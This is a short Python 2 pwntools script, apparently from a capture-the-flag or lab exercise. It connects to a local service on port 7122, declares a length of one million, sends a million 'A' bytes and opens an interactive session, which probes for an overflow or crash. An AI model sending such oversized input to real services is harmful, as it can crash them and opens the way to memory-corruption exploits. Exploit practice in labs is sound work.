#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
from IPython import embed

r = remote('127.0.0.1', 7122)
r.recvuntil('len:')
n = 1000000
r.sendline(str(n))
r.recvuntil('content:')
r.send('A'*n)
r.interactive()

